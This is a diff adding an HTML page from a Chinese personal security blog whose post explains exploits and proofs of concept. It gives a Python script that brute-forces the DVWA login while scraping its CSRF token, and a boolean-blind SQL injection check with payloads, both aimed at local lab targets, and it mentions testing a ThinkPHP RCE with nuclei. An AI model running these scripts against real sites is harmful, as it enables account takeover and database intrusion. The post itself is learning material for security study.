@@ -1,0 +1,216 @@
+<html>
+  <head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>pocexp指北 | Jasun9</title>
+<link rel="shortcut icon" href="https://jasunzhang.github.io//favicon.ico?v=1715674288690">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://jasunzhang.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="pocexp指北 | Jasun9 - Atom Feed" href="https://jasunzhang.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+  <meta name="description" content="来而不往非礼也" />
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://jasunzhang.github.io/">
+  <img class="avatar" src="https://jasunzhang.github.io//images/avatar.png?v=1715674288690" alt="">
+  </a>
+  <h1 class="site-title">
+    Jasun9
+  </h1>
+  <p class="site-description">
+    来而不往非礼也
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="current-tag-container">
+            <h2 class="title">
+                标签：# pocexp指北
+            </h2> 
+        </div>
+        <div class="post-container">
+  
+    <article class="post">
+      <a href="https://jasunzhang.github.io/post/guan-yu-exp-he-poc-de-ji-lu/">
+        <h2 class="post-title">关于exp和poc的记录</h2>
+      </a>
+      <div class="post-info">
+        <span>
+          2024-05-14
+        </span>
+        <span>
+          6 min read
+        </span>
+        
+          <a href="https://jasunzhang.github.io/tag/y99j9_nAI/" class="post-tag">
+            # pocexp指北
+          </a>
+        
+          <a href="https://jasunzhang.github.io/tag/qXZ0OLIUJ/" class="post-tag">
+            # python脚册
+          </a>
+        
+          <a href="https://jasunzhang.github.io/tag/1Wpns8h4a/" class="post-tag">
+            # vulnhub打靶
+          </a>
+        
+      </div>
+      
+      <div class="post-abstract">
+        <h2 id="前言">前言</h2>
+<p>最近发现，许多招聘实习对于exp和poc这些东西有一些要求，发现自己对于这个东西还没有什么理解，所以来学习一下。写下此笔记方便自己日后翻阅</p>
+<h2 id="正文">正文</h2>
+<p>我们在逛漏洞博客网站时，经常会看到写着poc的地方，虽然有一些朋友不知道他是什么意思，但是我们可以看内容，相信大部分同学都可以看出这个是在说如何证明的漏洞的数据包的</p>
+<figure data-type="image" tabindex="1"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202405141455890.png" alt="image-20240514145517826" loading="lazy"></figure>
+<p>先来前面简单说一下exp和poc是什么。</p>
+<p>&quot;Exp&quot; 通常是指 &quot;exploit&quot;，即利用计算机系统中的漏洞或弱点来获得未经授权的访问或执行特定操作的代码或技术。黑客或安全研究人员可能会使用 exploit 来测试系统的安全性或者进行攻击。</p>
+<p>&quot;Poc&quot; 则是 &quot;proof of concept&quot; 的缩写，意为 &quot;概念验证&quot;。它通常是指一个小型的漏洞验证程序，用于证明某个漏洞确实存在，而不是一个实际的利用程序。POC 有助于漏洞的确认和修复，使得系统的安全性得以提高。</p>
+<p>那么简单来说就是POC可以看成是一段验证的代码，就像是一个证据，能够证明漏洞的真实性是无害化的。EXP（Exploit）：简单点讲，就是通过EXP能够实现漏洞的利用价值。比如某个系统存在SQL注入漏洞，我们可以编写EXP来提取<a href="https://cloud.tencent.com/solution/database?from_column=20065&amp;from=20065">数据库</a>版本信息等。</p>
+<p>关于语言，语言只是工具载体，并不局限于Python。原则上你想用什么语言都可以，现在个人感觉很多都是yaml和json。当然也有python语言。</p>
+<p>接下来将会以暗月师傅的b站课程第一课内容为开始。先来感受一下这个。</p>
+<h3 id="crsf登录绕过的exp">crsf登录绕过的exp</h3>
+<p>编写有csrf后台验证的密码登录。本次环境选择的是dvwa的登录界面。</p>
+<p>我们需要先对这个登录界面进行分析。</p>
+<figure data-type="image" tabindex="2"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202405131521886.png" alt="image-20240513152132809" loading="lazy"></figure>
+<p>不难看出这里除了提交的这个账号密码之外还有一个user_token，每次还不一样，用来防治暴力破解。那么 我们就需要抓取这个值来帮助我们来实现</p>
+<figure data-type="image" tabindex="3"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202405131940052.png" alt="image-20240513194009946" loading="lazy"></figure>
+<p>发现这里在出现了这个user_token,我们利用python的正则表达式来进行筛选（数了一下32位，直接用search搜索一下）</p>
+<pre><code class="language-python"># -*- coding =utf-8 -*-
+# @time: 2024-05-13 15:01
+# @anthor: jasun
+# @file:csrf_login.py
+# @Asoftware:PyCharm
+import  requests
+import  re
+
+
+url=&quot;http://192.168.80.135/dvwa/login.php&quot;
+def login(password):
+ session=requests.session()
+ req=session.get(url)
+ user_token=re.search(&quot;[a-z0-9]{32}&quot;,req.text).group(0)
+ data={&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:password,&quot;Login&quot;:&quot;Login&quot;,&quot;user_token&quot;:user_token}
+ req=session.post(url=url,data=data)
+ html=req.text
+ print(html)
+ return html
+with open('passwordtop100.txt') as p: 
+    passwordlist=p.readlines()
+    p.close()
+for line in passwordlist:
+    line=line.strip(&quot;\n&quot;)
+    print(line)
+    if &quot;File Upload&quot; in login(line): ###找到登录成功的特征
+        print(&quot;[密码是 %s]&quot; %line)
+        break
+</code></pre>
+<p>那么我们运行后就可以发现已经完成登录了</p>
+<h3 id="sqli的exp">sqli的exp</h3>
+<p>这里我们以sql—lab举例</p>
+<p>布尔盲注：http://192.168.30.164/sqli/Less-5/<br>
+判断是否存在单引号闭合的sql注入<br>
+poc编写：结果有或者没有</p>
+<pre><code>import requests
+
+def verify(url):
+  payload1 = &quot;?id=1' and 1=1 --+&quot;
+  payload2 = &quot;?id=1' and 1=2 --+&quot;
+  resp1 = requests.get(url+payload1)
+  resp2 = requests.get(url+payload2)
+
+  text1 = resp1.text
+  text2 = resp2.text
+  print(text2)
+  if ('You are in' in text1) and ('You are in' not in text2):
+    print(url,'：存在单引号闭合的sql注入（盲注）')
+  else:
+    print(url,'：不存在单引号闭合的sql注入（盲注）')
+verify('http://192.168.30.164/sqli/Less-5/')
+</code></pre>
+<p>那么我们其实已经发现了这里有其实poc就是那样写出来就是，除了一些手动写的poc，还有一些工具其实也可以来一键获取poc。例如通过nuclei来入门。我们可以先在bp的拓展商店下载一个nuclei，然后再bp上编写poc。我们以thinkphp的5.0.23 Remote Code Execution Vulnerability举例（开头的poc），先用vulhub把环境启起来。</p>
+<figure data-type="image" tabindex="4"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202405141536283.png" alt="image-20240514153644205" loading="lazy"></figure>
+<p>先来bp抓包测试一下漏洞</p>
+<figure data-type="image" tabindex="5"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202405141541524.png" alt="image-20240514154118466" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202405141541304.png" alt="image-20240514154141260" loading="lazy"></figure>
+<p>逐一点击</p>
+<figure data-type="image" tabindex="7"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202405141542733.png" alt="image-20240514154259683" loading="lazy"></figure>
+<p>然后到插件中就找到了</p>
+<figure data-type="image" tabindex="8"><img src="https://jasun-1321731794.cos.ap-chengdu.myqcloud.com/pic/202405141545983.png" alt="image-20240514154502924" loading="lazy"></figure>
+<p>这里面是一些基础信息，我们右上角的保存了可以使用，同时我们还就可以利用nuclei.exe来进行批量的验证。</p>
+<p>相关的还有一些poc库和工具还有<a href="https://yaklang.io/products/intro/">yakit</a>,<a href="https://gobysec.net/">Goby</a>,长亭的<a href="https://stack.chaitin.com/tool/detail/1036">xpoc</a>。同时现在ai已经拥有不错的能力，可以尝试将部分内容分解给ai，利用它帮助完成相关内容</p>
+<p>如果你还对于poc不是了解，我认为xray的三周年官方课程非常不错，相信学习了会有很多收获。</p>
+<h2 id="参考">参考</h2>
+<p><a href="https://www.bilibili.com/video/BV1Jw411q7xA/">moonsecexp</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1496209">如何自己动手编写漏洞POC</a></p>
+<p><a href="https://www.freebuf.com/articles/web/382868.html">PoC免写攻略</a></p>
+<p><a href="https://docs.riskscanner.io/question/nuclei/">nuclei使用手册</a></p>
+<p><a href="https://www.freebuf.com/articles/network/361896.html">ChatGPT 写 PoC，拿下漏洞！</a></p>
+<p><a href="https://xz.aliyun.com/t/9701?time__1311=n4%2BxuDgD9AD%3DYExUx05DK3rbDcA9DR7Y4oD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">谈谈漏洞验证框架的构思与实现（一）</a></p>
+<p><a href="https://space.bilibili.com/521870525/search/video?keyword=%E4%B8%89%E5%91%A8%E5%B9%B4">长亭科技的三周年系列课</a></p>
+
+      </div>
+    </article>
+  
+</div>
+
+        <div class="pagination-container">
+  
+  
+</div>
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://jasunzhang.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+  </body>
+</html>
